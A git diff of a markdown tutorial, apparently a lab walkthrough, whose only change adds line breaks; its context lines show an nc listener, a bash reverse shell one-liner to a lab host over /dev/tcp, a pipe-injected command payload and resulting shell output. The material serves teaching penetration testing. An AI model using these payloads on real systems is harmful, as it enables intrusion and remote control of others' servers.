@@ -20,6 +20,8 @@ nc -l -p 1337 -vv
 > Outbound connections on port 1337 may raise suspicion and trigger alerts.
 > However, common ports such as 80 or 443 which are often used by HTTP, might be overlooked by blue team analysts.
 
+<br>
+<br>
 
 ## Crafting a Payload
 Next, craft an interactive reverse shell payload with a single line of bash.<br>
@@ -40,6 +42,8 @@ bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
 	- This also ensures the subsequent command is executed using bash, regardless of the default shell on the target system.
 	- If needed, you can even specify the bash shell's full executable path (using */bin/bash -c*) to further ensure the payload executes correctly.
 
+<br>
+<br>
 
 ## Delivering and Initializing the Payload
 To deliver the single-line reverse shell payload, exploit the OS command injection vulnerability that was previously identified in the web application server (172.16.10.12).
@@ -49,6 +53,8 @@ For example, we would deliver our single-line reverse shell payload by submittin
 |bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
 ```
 
+<br>
+<br>
 
 ## Executing Commands
 After exploiting the OS command injection payload by submitting the payload in the Input field of the vulnerable webpage,<br>
@@ -72,6 +78,8 @@ Linux p-web-02.acme-infinity-servers.com 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAM
 www-data@p-web-02:/var/www/html$ 
 ```
 
+<br>
+<br>
 
 ## Listening with Pwncat
 Pwncat is another great alternative utility for capturing and interacting with reverse shells.<br>
